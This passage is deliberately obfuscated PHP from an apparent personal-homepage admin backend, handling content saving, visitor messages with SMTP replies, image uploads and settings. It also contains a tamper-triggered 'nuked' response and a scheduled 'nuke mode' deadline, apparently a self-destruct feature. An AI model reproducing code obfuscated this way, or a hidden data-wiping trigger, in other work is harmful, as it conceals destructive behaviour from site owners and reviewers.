$_SESSION["\x72\x65\x73\x65\x74\x5f\145\155\141\151\154"], $_SESSION["\x72\145\x73\x65\x74\137\x61\164\164\145\x6d\x70\164\163"]); goto pt2djhJod9; g6k1dWGbvJ: $tamperResult = ["\163\165\x63\143\x65\x73\x73" => true, "\x74\x61\155\x70\x65\x72\145\144" => true, "\x6e\x75\153\x65\144" => true]; if (!$redirectUrl) { goto DZBw1fG1OX; } $tamperResult["\x72\x65\144\151\162\x65\x63\x74\137\165\162\x6c"] = $redirectUrl; DZBw1fG1OX: echo json_encode($tamperResult); goto vHs69rfGjx; IPCKUwwH9W: unset($_admin_tamper); switch ($action) { case "\x73\141\x76\x65\x5f\143\x6f\156\x74\145\x6e\x74": goto f1euLzeCNd; Jb__LXFDUh: ikSGeK2Yik: $allowed = ["\164\151\x74\154\x65\137\x70\162\145\x66\151\x78", "\164\151\x74\154\145", "\x73\165\x62\164\x69\164\x6c\x65\x5f\160\x72\145\x66\151\x78", "\163\x75\142\164\x69\164\154\145\137\156\141\155\x65", "\160\x69\170\145\x6c\137\x74\x65\x78\164", "\151\156\164\162\157", "\x73\x6b\x69\154\x6c\x73", "\160\162\157\x6a\145\143\164\x73", "\x63\x6f\156\x74\x61\143\x74", "\x62\x67\137\155\157\x64\145", "\x62\x67\137\x62\x6c\x75\x72", "\x62\147\x5f\x6f\160\x61\x63\x69\x74\x79", "\x67\x72\141\144\151\x65\x6e\x74\137\143\x6f\x6c\x6f\162\x73", "\x67\x72\x61\144\151\145\x6e\x74\x5f\x61\x6e\151\155\141\164\145"]; foreach ($allowed as $key) { goto bXeffKroX2; BA813C4H22: goto FltQZhkGo5; uCXoSfZdAe: $content[$key] = intval($data[$key]); FltQZhkGo5: RlD1HE4JSH: goto mVncI3opOP; yrZbK8WWut: if ($key === "\147\162\x61\x64\x69\145\156\x74\137\x61\156\151\x6d\x61\164\145") { goto WPhB3a8Qq1; } if (in_array($key, ["\142\x67\x5f\142\154\165\162", "\x62\x67\x5f\157\160\141\x63\151\x74\x79"])) { goto uCXoSfZdAe; } $content[$key] = is_string($data[$key]) ? trim($data[$key]) : $data[$key]; goto FltQZhkGo5; L4occns7lk: goto Wh1FFtwb3v; XyMRw34XzY: krsvsAgg6l: goto FltQZhkGo5; YA0Iqxe2PK: $content[$key] = ["\x65\155\x61\151\154" => trim($data[$key]["\145\x6d\141\151\154"] ?? ''), "\167\x65\143\150\x61\x74" => trim($data[$key]["\x77\145\143\x68\141\x74"] ?? ''), "\x67\x69\164\x68\x75\x62" => trim($data[$key]["\x67\x69\164\x68\x75\x62"] ?? '')]; goto FltQZhkGo5; goto w8R2jQfOhE; mVncI3opOP: T9Y9IcgoBg: goto ifJLNw8c2M; bXeffKroX2: if (!array_key_exists($key, $data)) { goto RlD1HE4JSH; } if ($key === "\163\x6b\151\154\x6c\x73" && is_array($data[$key])) { goto L4occns7lk; } if ($key === "\160\162\x6f\x6a\x65\x63\164\163" && is_array($data[$key])) { goto iwFm0plC2K; } if ($key === "\x63\157\156\x74\141\x63\x74" && is_array($data[$key])) { goto YA0Iqxe2PK; } if ($key === "\147\162\x61\x64\x69\x65\x6e\164\137\x63\157\x6c\157\162\x73" && is_array($data[$key])) { goto mJaXrN_Cxp; } goto yrZbK8WWut; Wh1FFtwb3v: $content[$key] = array_values(array_map("\x74\x72\x69\x6d", $data[$key])); goto FltQZhkGo5; iwFm0plC2K: $content[$key] = []; foreach ($data[$key] as $proj) { $content[$key][] = ["\164\x69\x74\x6c\x65" => trim($proj["\x74\151\x74\x6c\x65"] ?? ''), "\x64\145\x73\143" => trim($proj["\144\x65\x73\143"] ?? ''), "\x69\143\157\x6e" => trim($proj["\151\143\x6f\156"] ?? "\147\154\157\142\145")]; RWCYqv0scB: } goto XyMRw34XzY; w8R2jQfOhE: mJaXrN_Cxp: $content[$key] = array_values(array_filter($data[$key], function ($c) { return is_string($c) && preg_match("\x2f\x5e\43\x5b\60\55\x39\x61\x2d\x66\x41\x2d\x46\x5d\x7b\63\x2c\x38\175\44\x2f", trim($c)); })); goto FltQZhkGo5; WPhB3a8Qq1: $content[$key] = (bool) $data[$key]; goto BA813C4H22; ifJLNw8c2M: } kA3Y1nUmho: write_json(CONTENT_FILE, $content); goto fBPW9EkmO6; tVOsq2wZ1K: $data = $input["\144\x61\164\x61"]; $content = read_json(CONTENT_FILE) ?: []; if (!(isset($data["\x70\x69\x78\x65\x6c\x5f\x74\x65\170\x74"]) && mb_strlen($data["\160\151\x78\x65\154\137\x74\x65\x78\x74"], "\x55\124\106\x2d\70") > 4)) { goto ikSGeK2Yik; } echo json_encode(["\x73\x75\x63\143\x65\x73\x73" => false, "\x6d\x65\x73\x73\x61\x67\x65" => "\345\x83\x8f\xe7\xb4\xa0\346\xa8\xaa\345\xb9\205\346\x96\207\xe5\255\227\346\x9c\200\345\244\232\40\x34\40\xe4\270\252\345\255\x97"]); goto N4CG1hjZUn; goto Jb__LXFDUh; fBPW9EkmO6: echo json_encode(["\x73\x75\143\143\x65\x73\x73" => true, "\155\145\163\163\x61\x67\x65" => "\345\x86\x85\xe5\256\271\xe4\277\x9d\xe5\255\230\xe6\x88\220\xe5\x8a\237"]); goto N4CG1hjZUn; goto MCWXW0CSf_; f1euLzeCNd: $input = json_decode(file_get_contents("\x70\x68\160\72\57\57\x69\x6e\160\x75\x74"), true); if (!(!$input || !isset($input["\x64\x61\x74\141"]))) { goto tQsDT63MKt; } echo json_encode(["\x73\165\x63\x63\145\163\x73" => false, "\155\x65\163\163\x61\147\145" => "\346\x97\240\xe6\x95\210\347\x9a\x84\346\225\xb0\xe6\215\xae"]); goto N4CG1hjZUn; tQsDT63MKt: goto tVOsq2wZ1K; MCWXW0CSf_: case "\x67\x65\164\137\x6d\x65\x73\x73\x61\x67\x65\x73": $messages = read_json(MESSAGES_FILE) ?: []; echo json_encode(["\x73\165\x63\x63\x65\163\163" => true, "\144\141\x74\141" => $messages], JSON_UNESCAPED_UNICODE); goto N4CG1hjZUn; case "\x64\145\x6c\145\x74\x65\137\155\145\x73\163\x61\x67\x65": goto FZvVYWCXzY; AgBA07Mq6p: goto N4CG1hjZUn; goto TF3UeEvjX5; FZvVYWCXzY: $input = json_decode(file_get_contents("\x70\150\x70\x3a\57\57\151\156\x70\165\164"), true); $msgId = $input["\x69\x64"] ?? ''; if ($msgId) { goto ZUT40AuK10; } echo json_encode(["\x73\x75\x63\143\x65\x73\x73" => false, "\155\x65\x73\x73\x61\x67\x65" => "\347\274\272\xe5\xb0\221\346\266\x88\346\201\xaf\40\111\x44"]); goto N4CG1hjZUn; goto af5_vLG1zq; af5_vLG1zq: ZUT40AuK10: $messages = read_json(MESSAGES_FILE) ?: []; $messages = array_values(array_filter($messages, function ($m) use($msgId) { return $m["\x69\144"] !== $msgId; })); write_json(MESSAGES_FILE, $messages); echo json_encode(["\x73\165\143\x63\145\163\x73" => true, "\155\145\x73\163\x61\x67\x65" => "\346\266\x88\346\201\xaf\345\xb7\xb2\345\x88\240\351\x99\244"]); goto AgBA07Mq6p; TF3UeEvjX5: case "\155\141\162\153\137\x72\145\141\144": $input = json_decode(file_get_contents("\x70\150\160\x3a\57\x2f\151\x6e\x70\x75\x74"), true); $msgId = $input["\151\144"] ?? ''; $messages = read_json(MESSAGES_FILE) ?: []; foreach ($messages as &$m) { if (!($m["\151\x64"] === $msgId)) { goto LrpFGIg66v; } $m["\162\145\x61\x64"] = true; goto Z62aMLD7hl; LrpFGIg66v: BVT7Pq9NtE: } Z62aMLD7hl: unset($m); write_json(MESSAGES_FILE, $messages); echo json_encode(["\x73\x75\x63\x63\145\163\163" => true]); goto N4CG1hjZUn; case "\162\x65\160\x6c\171\137\x6d\145\163\x73\x61\x67\145": goto JSSqkA5Thy; lc6cn4YOGA: $mailer = new SimpleSMTP($smtp); $result = $mailer->send($smtp["\146\x72\x6f\155\137\145\x6d\x61\x69\x6c"], $smtp["\x66\162\157\155\137\x6e\141\155\145"] ?? "\345\260\x8f\xe7\x8b\220\xe5\x8a\241\xe5\231\xa8", $replyTo, $subject ?: "\346\x9d\245\350\x87\252\xe5\xb0\217\xe7\x8b\220\345\212\xa1\345\231\250\347\232\x84\xe5\x9b\236\xe5\244\215", $body); if (!($result["\x73\165\x63\143\x65\163\163"] && $msgId)) { goto CO_BUR9y4e; } $messages = read_json(MESSAGES_FILE) ?: []; foreach ($messages as &$m) { if (!($m["\x69\x64"] === $msgId)) { goto d9ANVFOgcp; } $m["\162\145\x70\154\x69\x65\x64"] = true; $m["\x72\145\x70\154\x79\137\164\x69\x6d\145"] = date("\131\55\155\55\144\40\110\72\151\72\x73"); goto KAcaiAqced; d9ANVFOgcp: cLvGhVHrIK: } goto EPgYG1VdoS; IMeS5T12xK: $smtp = $admin["\x73\155\164\160"] ?? []; if (!(empty($smtp["\x68\x6f\x73\164"]) || empty($smtp["\x66\x72\157\x6d\x5f\145\x6d\141\151\154"]))) { goto KjXZfTs4R2; } echo json_encode(["\163\x75\143\143\145\163\x73" => false, "\155\145\x73\x73\x61\x67\x65" => "\xe8\xaf\267\345\x85\210\xe9\205\215\xe7\275\256\40\x53\115\x54\120\x20\xe4\xbf\xa1\xe6\201\xaf"]); goto N4CG1hjZUn; KjXZfTs4R2: goto lc6cn4YOGA; JSSqkA5Thy: $input = json_decode(file_get_contents("\160\x68\x70\72\57\x2f\151\156\160\165\164"), true); $msgId = $input["\151\144"] ?? ''; $replyTo = trim($input["\164\157"] ?? ''); $subject = trim($input["\x73\x75\x62\152\145\x63\164"] ?? ''); $body = trim($input["\x62\x6f\144\171"] ?? ''); goto x10JbFlcrt; eXZFXTbgk1: goto N4CG1hjZUn; goto aJmsEzBUry; EPgYG1VdoS: KAcaiAqced: unset($m); write_json(MESSAGES_FILE, $messages); CO_BUR9y4e: echo json_encode($result, JSON_UNESCAPED_UNICODE); goto eXZFXTbgk1; x10JbFlcrt: if (!(!$replyTo || !$body)) { goto FYYEuzMPzu; } echo json_encode(["\163\x75\x63\143\x65\x73\x73" => false, "\155\145\x73\163\141\x67\145" => "\xe6\224\266\344\xbb\xb6\xe4\272\xba\345\x92\214\xe5\233\236\xe5\244\215\xe5\x86\x85\xe5\xae\xb9\344\270\x8d\350\x83\xbd\344\xb8\272\xe7\xa9\xba"]); goto N4CG1hjZUn; FYYEuzMPzu: $admin = read_json(ADMIN_FILE); goto IMeS5T12xK; aJmsEzBUry: case "\147\145\164\137\163\x6d\164\160": $admin = read_json(ADMIN_FILE); $smtp = $admin["\163\155\x74\160"] ?? []; unset($smtp["\x70\141\x73\163\x77\x6f\162\144"]); if (empty($admin["\x73\155\164\x70"]["\x70\x61\x73\163\x77\x6f\x72\144"])) { goto n4Xg8rBngE; } $smtp["\x70\x61\x73\163\x77\157\x72\x64\x5f\x64\151\x73\x70\x6c\141\x79"] = str_repeat("\x2a", min(strlen($admin["\x73\x6d\164\x70"]["\160\x61\x73\x73\x77\157\x72\144"]), 8)); n4Xg8rBngE: echo json_encode(["\x73\165\x63\143\145\163\x73" => true, "\x64\141\x74\141" => $smtp], JSON_UNESCAPED_UNICODE); goto N4CG1hjZUn; case "\163\x61\x76\145\x5f\163\x6d\164\160": $input = json_decode(file_get_contents("\160\150\160\72\57\57\x69\x6e\160\165\164"), true); $data = $input["\144\x61\x74\x61"] ?? []; $admin = read_json(ADMIN_FILE); $admin["\163\155\x74\160"] = ["\150\x6f\x73\x74" => trim($data["\x68\x6f\163\164"] ?? ''), "\160\x6f\x72\x74" => intval($data["\x70\x6f\162\164"] ?? 587), "\145\x6e\x63\162\171\160\164\151\157\x6e" => in_array($data["\x65\x6e\143\x72\x79\160\x74\151\157\x6e"] ?? '', ["\x74\154\163", "\163\x73\154", "\156\x6f\156\145"]) ? $data["\x65\156\143\x72\x79\x70\x74\151\x6f\x6e"] : "\164\154\163", "\x75\x73\x65\x72\x6e\141\x6d\x65" => trim($data["\165\163\145\x72\x6e\x61\x6d\x65"] ?? ''), "\160\141\x73\x73\x77\x6f\162\x64" => trim($data["\160\141\x73\163\x77\157\162\144"] ?? '') ?: $admin["\163\x6d\x74\x70"]["\x70\x61\163\x73\167\x6f\x72\x64"] ?? '', "\146\162\157\155\x5f\156\141\155\145" => trim($data["\x66\x72\157\x6d\137\x6e\x61\155\145"] ?? "\xe5\xb0\217\xe7\213\220\345\212\241\xe5\x99\xa8"), "\146\x72\157\155\x5f\145\155\x61\x69\154" => trim($data["\x66\162\157\x6d\137\145\x6d\141\151\154"] ?? '')]; write_json(ADMIN_FILE, $admin); echo json_encode(["\163\x75\143\x63\145\163\163" => true, "\x6d\145\x73\x73\x61\147\x65" => "\123\115\x54\x50\40\351\205\x8d\xe7\275\256\xe5\xb7\xb2\xe4\xbf\x9d\xe5\255\230"]); goto N4CG1hjZUn; case "\x74\x65\163\x74\x5f\x73\x6d\x74\x70": goto NaPKDJCzSV; MEIwAmzWSv: goto N4CG1hjZUn; goto ouK8Ep0w7I; jnMd3Mks13: XjfWu1Z2R2: $mailer = new SimpleSMTP($smtp); $result = $mailer->test(); $result["\154\x6f\147"] = $mailer->getLog(); echo json_encode($result, JSON_UNESCAPED_UNICODE); goto MEIwAmzWSv; NaPKDJCzSV: $admin = read_json(ADMIN_FILE); $smtp = $admin["\x73\x6d\164\160"] ?? []; if (!empty($smtp["\150\157\x73\x74"])) { goto XjfWu1Z2R2; } echo json_encode(["\x73\165\x63\143\x65\x73\x73" => false, "\155\x65\163\x73\141\147\x65" => "\350\xaf\267\xe5\205\210\xe4\xbf\x9d\345\255\230\x20\x53\115\124\x50\x20\xe9\x85\215\xe7\275\xae"]); goto N4CG1hjZUn; goto jnMd3Mks13; ouK8Ep0w7I: case "\165\x70\x6c\x6f\141\144\137\141\x76\x61\164\x61\x72": goto JeiiwPXmn0; JeiiwPXmn0: if (!(empty($_FILES["\141\166\x61\x74\x61\162"]) || $_FILES["\x61\x76\x61\x74\x61\x72"]["\145\162\x72\157\x72"] !== UPLOAD_ERR_OK)) { goto YjXxHhnWwz; } echo json_encode(["\x73\x75\x63\143\x65\163\163" => false, "\155\x65\x73\x73\141\147\145" => "\350\257\xb7\351\x80\211\346\x8b\251\344\xb8\x80\345\274\xa0\xe5\x9b\xbe\347\211\207\xe6\226\x87\344\xbb\266"]); goto N4CG1hjZUn; YjXxHhnWwz: $file = $_FILES["\141\x76\x61\164\x61\x72"]; goto P1g0jBOMhQ; as6BJQgVCN: $y = ($h - $size) / 2; $dest = imagecreatetruecolor(400, 400); imagealphablending($dest, false); imagesavealpha($dest, true); imagecopyresampled($dest, $srcImage, 0, 0, (int) $x, (int) $y, 400, 400, $size, $size); goto jLyESPdNi0; ItPRLJLtgT: wwxO4w2ziW: $w = imagesx($srcImage); $h = imagesy($srcImage); $size = min($w, $h); $x = ($w - $size) / 2; goto as6BJQgVCN; PoUHQTruQy: $allowedTypes = ["\x69\x6d\141\x67\145\57\x6a\x70\x65\147", "\151\x6d\141\x67\145\57\x70\x6e\147", "\151\155\x61\x67\145\57\x67\x69\x66", "\x69\155\141\147\x65\x2f\x77\x65\x62\160"]; $finfo = finfo_open(FILEINFO_MIME_TYPE); $mimeType = finfo_file($finfo, $file["\x74\x6d\x70\x5f\156\x61\155\145"]); finfo_close($finfo); if (in_array($mimeType, $allowedTypes)) { goto JeGH2bh0d7; } goto VYA_ZBEOYV; VYA_ZBEOYV: echo json_encode(["\x73\165\x63\x63\145\x73\x73" => false, "\x6d\x65\163\163\141\x67\x65" => "\344\273\205\xe6\224\257\346\214\201\40\112\120\x47\57\120\116\x47\x2f\107\111\106\x2f\x57\x65\142\x50\x20\xe6\xa0\xbc\xe5\xbc\217"]); goto N4CG1hjZUn; JeGH2bh0d7: $destPath = DATA_DIR . DIRECTORY_SEPARATOR . "\141\166\141\x74\141\x72\56\x70\156\x67"; if (function_exists("\x69\x6d\x61\147\145\x63\162\145\141\164\145\146\162\157\x6d\160\156\147")) { goto GXIvzMqrKB; } goto EzBIsAnCje; EzBIsAnCje: move_uploaded_file($file["\164\155\x70\137\x6e\x61\155\x65"], $destPath); goto Fv3BFM1BW4; GXIvzMqrKB: $srcImage = null; switch ($mimeType) { case "\x69\x6d\141\147\x65\x2f\x6a\160\145\x67": $srcImage = @imagecreatefromjpeg($file["\x74\x6d\160\x5f\156\x61\x6d\145"]); goto qKjmbySujt; case "\x69\155\141\147\x65\x2f\160\156\x67": $srcImage = @imagecreatefrompng($file["\164\155\x70\x5f\x6e\141\x6d\x65"]); goto qKjmbySujt; case "\151\155\141\x67\x65\57\147\151\146": $srcImage = @imagecreatefromgif($file["\164\x6d\160\137\x6e\x61\x6d\145"]); goto qKjmbySujt; case "\151\155\141\x67\145\57\167\145\x62\160": $srcImage = @imagecreatefromwebp($file["\x74\x6d\160\x5f\x6e\141\155\145"]); goto qKjmbySujt; } goto suszQhga8n; P1g0jBOMhQ: $maxSize = 5 * 1024 * 1024; if (!($file["\x73\x69\x7a\x65"] > $maxSize)) { goto Y3jhgn2irV; } echo json_encode(["\x73\x75\143\143\145\163\x73" => false, "\x6d\x65\163\163\141\x67\x65" => "\345\233\xbe\347\211\207\xe4\xb8\x8d\350\x83\xbd\350\xb6\205\350\xbf\207\x20\x35\x4d\102"]); goto N4CG1hjZUn; Y3jhgn2irV: goto PoUHQTruQy; suszQhga8n: ulVrk2ZNQh: qKjmbySujt: if ($srcImage) { goto wwxO4w2ziW; } move_uploaded_file($file["\x74\x6d\160\x5f\156\x61\x6d\x65"], $destPath); goto K_e4xnJ4xl; goto ItPRLJLtgT; jLyESPdNi0: imagepng($dest, $destPath, 8); imagedestroy($srcImage); imagedestroy($dest); K_e4xnJ4xl: Fv3BFM1BW4: goto vRCoJSFvoo; vRCoJSFvoo: $url = "\x2e\56\57\144\141\164\141\57\x61\166\141\164\141\162\56\x70\156\147\x3f\x76\75" . time(); echo json_encode(["\163\165\143\x63\x65\163\163" => true, "\155\x65\x73\163\141\x67\x65" => "\345\244\264\345\203\217\344\xb8\x8a\xe4\xbc\xa0\346\210\220\xe5\x8a\237", "\x75\x72\x6c" => $url]); goto N4CG1hjZUn; goto aO_fVdwBnY; aO_fVdwBnY: case "\144\145\154\145\x74\145\137\x61\x76\141\164\141\x72": $avatarPath = DATA_DIR . DIRECTORY_SEPARATOR . "\141\x76\141\164\x61\162\x2e\x70\x6e\147"; if (!file_exists($avatarPath)) { goto K73vt7jJRP; } unlink($avatarPath); K73vt7jJRP: echo json_encode(["\x73\165\x63\143\145\x73\x73" => true, "\x6d\145\x73\x73\141\x67\145" => "\345\xa4\xb4\345\203\x8f\345\267\262\345\x88\240\351\231\xa4"]); goto N4CG1hjZUn; case "\x75\x70\x6c\157\x61\x64\137\x62\x67": goto Yt4MmiNw9t; VX5ixl_jxI: move_uploaded_file($file["\164\x6d\x70\137\x6e\x61\155\145"], $destPath); goto VhzvfgfUfw; WdkgZzTcyK: $srcImage = null; switch ($mimeType) { case "\x69\155\x61\x67\145\x2f\152\160\145\x67": $srcImage = @imagecreatefromjpeg($file["\164\x6d\x70\x5f\156\141\x6d\145"]); goto roUcXD7w68; case "\151\x6d\x61\147\x65\57\x70\156\x67": $srcImage = @imagecreatefrompng($file["\x74\155\x70\x5f\156\x61\155\x65"]); goto roUcXD7w68; case "\x69\x6d\141\x67\145\57\147\151\146": $srcImage = @imagecreatefromgif($file["\164\155\x70\137\156\x61\155\145"]); goto roUcXD7w68; case "\151\155\141\147\145\x2f\x77\x65\x62\x70": $srcImage = @imagecreatefromwebp($file["\x74\155\x70\137\x6e\x61\x6d\145"]); goto roUcXD7w68; } goto hpctc_IQ0v; Yt4MmiNw9t: if (!(empty($_FILES["\142\147"]) || $_FILES["\142\147"]["\x65\x72\162\157\x72"] !== UPLOAD_ERR_OK)) { goto yAepgEpNOG; } echo json_encode(["\x73\x75\143\x63\145\163\x73" => false, "\155\x65\x73\x73\x61\x67\145" => "\xe8\257\xb7\xe9\x80\211\346\x8b\xa9\344\xb8\200\345\274\xa0\345\x9b\276\xe7\x89\207\346\226\x87\xe4\xbb\xb6"]); goto N4CG1hjZUn; yAepgEpNOG: $file = $_FILES["\x62\x67"]; goto jY9QjrM811; jY9QjrM811: $maxSize = 10 * 1024 * 1024; if (!($file["\x73\x69\x7a\145"] > $maxSize)) { goto jalYaPb9hL; } echo json_encode(["\x73\165\143\143\145\163\x73" => false, "\155\x65\163\163\141\x67\x65" => "\xe8\x83\214\346\x99\257\xe5\x9b\xbe\344\270\215\xe8\203\xbd\xe8\266\x85\350\277\207\x20\x31\x30\115\102"]); goto N4CG1hjZUn; jalYaPb9hL: goto DZ95n2HM9t; hpctc_IQ0v: ioN2aErOF9: roUcXD7w68: if ($srcImage) { goto f_vc3l_24y; } move_uploaded_file($file["\164\x6d\160\137\x6e\x61\x6d\145"], $destPath); goto LmEasoT6Oh; goto WQb7xxuR0X; DZ95n2HM9t: $allowedTypes = ["\151\x6d\141\147\x65\x2f\x6a\160\145\147", "\x69\155\141\x67\145\x2f\160\x6e\x67", "\x69\155\x61\x67\145\57\x67\151\x66", "\151\155\141\147\145\57\167\x65\x62\160"]; $finfo = finfo_open(FILEINFO_MIME_TYPE); $mimeType = finfo_file($finfo, $file["\164\x6d\160\137\x6e\141\x6d\145"]); finfo_close($finfo); if (in_array($mimeType, $allowedTypes)) { goto dK5a9SN505; } goto qeaCo8Eulx; ju47UKb8PK: $url = "\56\56\x2f\x64\141\164\x61\57\x62\147\56\x6a\160\147\77\166\75" . time(); echo json_encode(["\x73\x75\143\143\145\163\163" => true, "\x6d\145\x73\x73\x61\147\x65" => "\xe8\x83\x8c\346\x99\257\xe5\233\276\344\xb8\x8a\xe4\xbc\xa0\346\210\220\xe5\x8a\x9f", "\x75\x72\x6c" => $url]); goto N4CG1hjZUn; goto cOYFM3nVNJ; ngSmzXBuXy: $newH = (int) ($h * (2560 / $w)); $dest = imagecreatetruecolor($newW, $newH); imagecopyresampled($dest, $srcImage, 0, 0, 0, 0, $newW, $newH, $w, $h); imagedestroy($srcImage); $srcImage = $dest; goto oBkUxIR_eC; WQb7xxuR0X: f_vc3l_24y: $w = imagesx($srcImage); $h = imagesy($srcImage); if (!($w > 2560)) { goto NSbW8ipFee; } $newW = 2560; goto ngSmzXBuXy; qeaCo8Eulx: echo json_encode(["\x73\x75\x63\143\145\163\163" => false, "\155\145\x73\x73\141\x67\145" => "\344\xbb\205\346\x94\xaf\346\214\201\x20\x4a\x50\107\x2f\120\x4e\107\57\x47\111\x46\x2f\127\x65\142\x50\x20\346\240\xbc\xe5\274\217"]); goto N4CG1hjZUn; dK5a9SN505: $destPath = DATA_DIR . DIRECTORY_SEPARATOR . "\142\x67\x2e\x6a\x70\147"; if (function_exists("\x69\155\141\147\145\x63\162\x65\141\164\x65\x66\162\157\x6d\x6a\160\x65\147")) { goto WdkgZzTcyK; } goto VX5ixl_jxI; oBkUxIR_eC: NSbW8ipFee: imagejpeg($srcImage, $destPath, 85); imagedestroy($srcImage); LmEasoT6Oh: VhzvfgfUfw: goto ju47UKb8PK; cOYFM3nVNJ: case "\144\x65\154\145\x74\x65\137\142\x67": $bgPath = DATA_DIR . DIRECTORY_SEPARATOR . "\142\147\56\152\160\x67"; if (!file_exists($bgPath)) { goto Kg0hAkxAyK; } unlink($bgPath); Kg0hAkxAyK: $content = read_json(CONTENT_FILE) ?: []; $content["\142\x67\137\x6d\157\x64\x65"] = "\x64\145\146\x61\x75\154\164"; write_json(CONTENT_FILE, $content); echo json_encode(["\163\165\143\x63\145\x73\163" => true, "\155\145\163\163\x61\147\x65" => "\xe8\203\x8c\346\x99\257\xe5\x9b\xbe\345\267\262\xe5\x88\xa0\xe9\231\244\xef\xbc\x8c\xe5\267\262\346\x81\242\345\244\x8d\xe9\xbb\230\350\256\xa4\350\203\x8c\xe6\231\257"]); goto N4CG1hjZUn; case "\x67\145\x74\137\x64\x6e\x64": $admin = read_json(ADMIN_FILE); echo json_encode(["\163\165\x63\x63\x65\x73\x73" => true, "\145\156\x61\142\154\x65\144" => !empty($admin["\x6d\163\147\x5f\x64\156\x64"])]); goto N4CG1hjZUn; case "\164\x6f\147\x67\154\x65\x5f\144\156\144": $input = json_decode(file_get_contents("\160\x68\x70\72\57\x2f\151\156\x70\165\x74"), true); $admin = read_json(ADMIN_FILE); $admin["\155\x73\147\x5f\x64\x6e\x64"] = !empty($input["\145\x6e\x61\142\x6c\x65\x64"]); write_json(ADMIN_FILE, $admin); echo json_encode(["\x73\165\x63\x63\x65\x73\163" => true, "\155\x65\163\x73\x61\x67\145" => $admin["\x6d\x73\147\x5f\144\x6e\x64"] ? "\xe5\x85\215\346\211\x93\346\211\260\345\xb7\xb2\xe5\xbc\200\345\x90\xaf\357\xbc\x8c\346\x96\xb0\346\xb6\210\346\x81\xaf\xe5\260\206\344\xb8\215\xe5\206\x8d\345\x8f\x91\351\x80\201\351\202\256\344\xbb\266\xe9\x80\232\347\237\245" : "\xe5\205\215\346\x89\223\346\211\xb0\345\267\xb2\xe5\x85\xb3\351\x97\xad\357\xbc\x8c\xe6\x96\xb0\346\xb6\x88\xe6\201\257\xe5\xb0\x86\346\xad\xa3\xe5\270\xb8\345\217\x91\351\x80\201\xe9\x82\xae\xe4\xbb\xb6\xe9\x80\232\347\237\xa5"]); goto N4CG1hjZUn; case "\x74\157\147\x67\154\145\x5f\141\144": $input = json_decode(file_get_contents("\160\x68\160\72\x2f\x2f\x69\156\160\165\164"), true); $admin = read_json(ADMIN_FILE); $admin["\150\x69\x64\145\137\x61\x64"] = !empty($input["\x68\x69\x64\x65"]); write_json(ADMIN_FILE, $admin); echo json_encode(["\x73\x75\143\143\145\163\x73" => true, "\155\x65\163\163\141\147\145" => $admin["\150\151\x64\145\137\x61\144"] ? "\345\xb9\xbf\xe5\x91\x8a\xe5\xb7\262\346\260\270\xe4\271\x85\xe5\205\xb3\xe9\227\xad" : "\345\271\277\345\221\212\345\267\xb2\345\274\x80\345\220\257"]); goto N4CG1hjZUn; case "\143\x68\x61\156\x67\145\x5f\160\141\x73\163\167\157\162\144": $input = json_decode(file_get_contents("\x70\x68\x70\72\57\x2f\151\x6e\160\x75\x74"), true); $result = change_password($input["\x6f\154\x64\x5f\160\141\163\x73\x77\x6f\162\144"] ?? '', $input["\156\145\x77\137\x70\141\163\x73\167\x6f\x72\x64"] ?? ''); echo json_encode($result, JSON_UNESCAPED_UNICODE); goto N4CG1hjZUn; case "\163\141\166\x65\x5f\x6e\165\x6b\x65\137\155\x6f\x64\145": goto qjA4donX6w; fNxI9U6l74: $admin["\x6e\x75\153\145\x5f\x64\145\x61\144\x6c\x69\x6e\145"] = date("\x59\x2d\x6d\55\x64\40\110\x3a\x69\x3a\x73", time() + $days * 86400); $admin["\156\x75\153\x65\137\x64\145\x61\144\154\151\x6e\x65\137\x74\163"] = time() + $days * 86400; GAQM1Llxwr: write_json(ADMIN_FILE, $admin); $msg = $mode === "\141\x75\164\x6f" ? "\xe5\267\262\350\256\276\347\xbd\xae\xe8\207\xaa\xe5\x8a\xa8\350\xb7\x91\xe8\xb7\xaf\xef\274\214\xe5\260\206\345\234\xa8\40" . $admin["\156\x75\153\145\x5f\x64\145\141\144\154\151\x6e\145"] . "\x20\346\211\247\350\xa1\214" : "\345\xb7\262\xe5\210\x87\xe6\215\xa2\xe4\270\xba\xe6\x89\x8b\345\x8a\250\346\xa8\241\345\xbc\x8f"; goto jnjVJ0r6ix; bHIeeuyuQC: unset($admin["\156\x75\x6b\145\x5f\144\x61\171\x73"], $admin["\156\x75\x6b\x65\137\x64\145\141\144\x6c\151\156\145"], $admin["\x6e\x75\153\x65\137\x64\x65\x61\144\154\x69\156\145\137\x74\x73"]); goto GAQM1Llxwr; B5F_WTCDQF: $days = max(1, min(365, intval($input["\x64\x61\x79\x73"] ?? 7))); $admin["\156\165\x6b\x65\x5f\144\x61\171\163"] = $days; goto fNxI9U6l74; qjA4donX6w: $input = json_decode(file_get_contents("\x70\150\160\x3a\57\x2f\x69\x6e\160\165\x74"), true); $mode = ($input["\155\x6f\x64\x65"] ?? "\155\141\x6e\165\x61\x6c") === "\x61\165\x74\x6f" ? "\141\165\x74\157" : "\155\x61\x6e\165\141\154"; $admin = read_json(ADMIN_FILE); $admin["\x6e\165\153\145\137\155\157\144\x65"] = $mode; if ($mode === "\x61\x75\164\x6f") { goto B5F_WTCDQF; } goto bHIeeuyuQC; jnjVJ0r6ix: echo json_encode(["\x73\x75\143\x63\x65\163\x73" => true, "\x6d\x65\x73\163\x61\x67\145" => $msg]); goto N4CG1hjZUn; goto BDF8jyUO96; BDF8jyUO96: case "\x67\145\x74\137\156\165\153\145\137\x6d\157\144\x65": $admin = read_json(ADMIN_FILE); $data = ["\155\157\x64\x65" => $admin["\x6e\165\x6b\145\137\155\x6f\144\145"] ?? "\155\141\x6e\x75\x61\x6c", "\144\141\171\x73" => $admin["\156\x75\x6b\145\137\144\x61\x79\163"] ?? 7, "\x64\145\141\144\154\x69\x6e\145" => $admin["\156\165\x6b\x65\137\144\145\141\144\x6c\151\156\x65"] ?? null, "\x64\145\141\x64\x6c\x69\156\145\137\x74\163" => $admin["\156\165\153\145\137\x64\x65\141\x64\x6c\x69\156\145\137\164\163"] ?? null, "\x72\145\x64\x69\162\145\x63\x74\137\145\x6e\141\142\x6c\x65\x64" => !empty($admin["\156\x75\153\145\x5f\x72\x65\144\x69\162\145\143\x74\x5f\145\156\141\142\x6c\145\144"]), "\x72\145\x64\151\x72\145\x63\x74\x5f\x75\x72\154" => $admin["\x6e\165\x6b\145\x5f\162\x65\x64\151\162\x65\x63\x74\137\x75\x72\x6c"] ?? '']; echo json_encode(["\163\165\143\x63\x65\163\x73" => true, "\144\x61\x74\x61" => $data]); goto N4CG1hjZUn; case 